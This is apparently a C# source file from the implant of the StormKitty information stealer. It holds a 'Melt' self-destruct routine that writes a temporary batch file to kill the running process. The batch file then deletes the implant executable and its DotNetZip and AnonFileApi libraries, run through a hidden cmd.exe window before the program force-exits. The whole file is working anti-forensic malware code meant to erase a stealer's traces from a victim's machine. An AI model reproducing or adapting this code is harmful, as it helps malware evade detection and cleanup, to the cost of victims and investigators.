using System.IO;
using System.Diagnostics;

namespace StormKitty.Implant
{
    internal sealed class SelfDestruct
    {
        /// <summary>
        /// Delete file after first start
        /// </summary>
        public static void Melt()
        {
            // Paths
            string batch = Path.GetTempFileName() + ".bat";
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string dll1 = Path.Combine(Path.GetDirectoryName(path), "DotNetZip.dll");
            string dll2 = Path.Combine(Path.GetDirectoryName(path), "AnonFileApi.dll");
            int currentPid = Process.GetCurrentProcess().Id;
            // Write batch
            using (StreamWriter sw = File.AppendText(batch))
            {
                sw.WriteLine("chcp 65001");
                sw.WriteLine("TaskKill /F /IM " + currentPid);
                sw.WriteLine("Timeout /T 2 /Nobreak");
                sw.WriteLine($"Del /ah \"{path}\" & Del /ah \"{dll1}\" & Del /ah \"{dll2}\"");
            }
            // Log
            Logging.Log("SelfDestruct : Running self destruct procedure...");
            // Start
            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = "/C " + batch,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
            // Wait for exit
            System.Threading.Thread.Sleep(5000);
            System.Environment.FailFast(null);
        }
    }
}
